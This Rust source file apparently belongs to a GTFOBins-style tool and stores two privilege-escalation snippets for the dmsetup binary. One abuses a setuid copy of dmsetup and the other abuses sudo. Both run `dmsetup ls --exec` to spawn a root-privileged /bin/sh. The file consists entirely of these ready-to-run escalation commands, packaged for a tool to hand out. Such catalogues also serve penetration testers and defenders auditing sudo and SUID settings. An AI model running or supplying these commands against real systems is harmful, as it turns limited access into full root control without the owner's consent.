
pub static BIN_NAME: &'static str = "dmsetup";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which dmsetup) .

    ./dmsetup create base <<EOF
    0 3534848 linear /dev/loop0 94208
    EOF
    ./dmsetup ls --exec '/bin/sh -p -s'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo dmsetup create base <<EOF
    0 3534848 linear /dev/loop0 94208
    EOF
    sudo dmsetup ls --exec '/bin/sh -s'
"#;
use crate::code::{Code, Tag};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
